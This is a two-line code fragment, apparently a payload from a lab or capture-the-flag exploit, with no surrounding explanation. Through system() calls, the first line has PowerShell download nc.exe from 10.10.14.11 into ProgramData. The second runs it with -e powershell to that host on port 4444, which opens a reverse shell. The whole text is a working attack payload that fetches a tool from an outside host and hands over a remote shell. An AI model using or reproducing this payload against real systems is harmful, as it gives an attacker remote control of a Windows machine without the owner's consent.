system("powershell -c wget 10.10.14.11/nc.exe -outfile \\programdata\\nc.exe");
system("\\programdata\\nc.exe -e powershell 10.10.14.11 4444");
